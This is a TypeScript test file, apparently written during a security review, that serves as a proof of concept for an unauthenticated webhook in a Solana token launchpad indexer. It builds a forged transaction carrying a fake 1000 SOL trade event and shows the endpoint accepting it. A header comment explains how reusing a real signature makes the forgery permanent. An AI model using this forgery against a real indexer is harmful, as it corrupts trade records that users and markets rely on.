/**
 * PoC for finding H-1: the indexer's `POST /helius` ingests the request body as a chain
 * transaction. With HELIUS_WEBHOOK_SECRET unset the check is skipped entirely (fail-open),
 * and the payload is never verified against the chain, so a forged "transaction" carrying
 * a fabricated FUMPAD emit_cpi event decodes exactly like a real one. Ingest is idempotent
 * by signature, so a forged payload that reuses a REAL, not-yet-polled signature wins the
 * race: the real tx later counts as a duplicate and the finalizer then confirms the
 * signature as finalized, keeping the forged contents for good.
 *
 * Run (from services/):  node --import tsx --test ../security-review/services-poc/webhook-forgery.test.ts
 */
import assert from "node:assert/strict";
import { createServer } from "node:http";
import type { AddressInfo } from "node:net";
import { after, it } from "node:test";

import { Keypair } from "@solana/web3.js";
import bs58 from "bs58";

import { bn } from "../../services/sdk/src/borsh.ts";
import { fumpadCoder, FUMPAD_IDL } from "../../services/sdk/src/coder.ts";
import { EVENT_IX_TAG, FUMPAD_PROGRAM_ID } from "../../services/sdk/src/constants.ts";
import { decodeTransactionEvents, type TxLike } from "../../services/sdk/src/events.ts";
import { eventAuthorityPda } from "../../services/sdk/src/pda.ts";
import { heliusWebhookHandler } from "../../services/indexer/src/sources/push.ts";

const disc = (name: string) => (FUMPAD_IDL.events as { name: string; discriminator: number[] }[]).find((e) => e.name === name)!.discriminator;

function forgedTrade(signature: string): TxLike {
  const mint = Keypair.generate().publicKey;
  const user = Keypair.generate().publicKey;
  const body = fumpadCoder().types.encode("Trade", {
    mint, user, is_buy: true, on_amm: false,
    token_amount: bn(1n), sol_amount: bn(1_000_000_000_000n), // a 1000 SOL "buy"
    fee_pool: bn(0n), fee_platform: bn(0n), fee_creator: bn(0n), pool_tokens_bought: bn(0n),
    price_q64: bn(1n << 80n), virtual_sol_reserves: bn(1n), virtual_token_reserves: bn(1n),
    ts: bn(BigInt(Math.floor(Date.now() / 1000))), snipe_tax: bn(0n), snipe_tax_bps: 0,
  });
  const data = bs58.encode(Uint8Array.from([...EVENT_IX_TAG, ...disc("Trade"), ...body]));
  return {
    slot: 999_999_999,
    blockTime: Math.floor(Date.now() / 1000),
    transaction: { signatures: [signature], message: { accountKeys: [user.toBase58(), FUMPAD_PROGRAM_ID.toBase58(), eventAuthorityPda().toBase58()], instructions: [] } },
    meta: { err: null, logMessages: [], innerInstructions: [{ index: 0, instructions: [{ programIdIndex: 1, accounts: [2], data }] }] },
  };
}

const ingested: { sig: string; events: string[] }[] = [];
const stubIngestor = {
  async ingest(tx: TxLike) {
    ingested.push({ sig: tx.transaction.signatures[0], events: decodeTransactionEvents(tx).map((e) => e.name) });
    return { signature: tx.transaction.signatures[0], status: "applied", events: 1, mints: [] };
  },
};
const log = { warn() {}, info() {}, debug() {}, error() {} };
// Exactly how Indexer.start() wires it when HELIUS_WEBHOOK_SECRET is not set.
const server = createServer(heliusWebhookHandler(stubIngestor as never, log as never, undefined));
await new Promise<void>((r) => server.listen(0, "127.0.0.1", r));
after(() => server.close());

it("accepts an unauthenticated forged transaction and decodes a fake Trade event from it", async () => {
  const { port } = server.address() as AddressInfo;
  const res = await fetch(`http://127.0.0.1:${port}/helius`, { method: "POST", body: JSON.stringify([forgedTrade("5".repeat(88))]) });
  assert.equal(res.status, 200);
  await new Promise((r) => setTimeout(r, 50));
  assert.deepEqual(ingested, [{ sig: "5".repeat(88), events: ["Trade"] }]);
});
